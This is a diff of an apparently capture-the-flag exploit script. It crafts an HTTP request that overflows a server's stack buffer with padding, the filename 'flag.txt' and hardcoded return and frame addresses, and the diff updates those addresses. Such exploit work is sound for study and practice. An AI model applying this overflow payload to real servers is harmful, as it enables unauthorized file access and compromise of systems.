@@ -56,13 +56,15 @@ continue
 
 io = start()
 
+
 request = b'GET /index.html HTTP/1.1\r\n'
 
 # rbp-0xa0 -> rbp-0x8
 filename = b'flag.txt'
 
 request += b'head:K' + (0xa0-16)* b'\0' + filename + b'\0' * 16
-request += p64(0x7ffff7d80dc0) + p64(0x7ffff7d80e50) + p64(0x401610) # addr of new filename / old rbp / addr of return in handle_clients
+#request += p64(0x7ffff7d8adc0) + p64(0x7ffff7d8ae50) + p64(0x4015ba) # addr of new filename / old rbp / addr of return in handle_clients
+request += p64(0x7ffff7d8bdc0) + p64(0x7ffff7d8be50) + p64(0x4015ba)
 request += b'\r\n'
 request += b'\r\n'
 
